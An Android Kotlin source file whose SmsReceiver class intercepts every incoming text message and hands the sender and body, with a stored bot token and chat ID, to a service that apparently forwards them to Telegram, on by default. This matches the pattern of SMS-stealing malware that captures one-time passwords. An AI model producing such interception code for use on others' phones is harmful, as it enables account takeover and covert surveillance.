package com.proyek.nuklir

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val prefs = context.getSharedPreferences("nuklir_prefs", Context.MODE_PRIVATE)
            val isEnabled = prefs.getBoolean("forward_enabled", true)
            if (!isEnabled) return

            val token = prefs.getString("bot_token", "") ?: ""
            val chatId = prefs.getString("chat_id", "") ?: ""

            if (token.isEmpty() || chatId.isEmpty()) return

            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (sms in messages) {
                val sender = sms.displayOriginatingAddress ?: "Unknown"
                val body = sms.messageBody ?: ""

                val serviceIntent = Intent(context, TelegramService::class.java).apply {
                    putExtra("sender", sender)
                    putExtra("message", body)
                    putExtra("token", token)
                    putExtra("chatId", chatId)
                }
                context.startService(serviceIntent)
            }
        }
    }
}
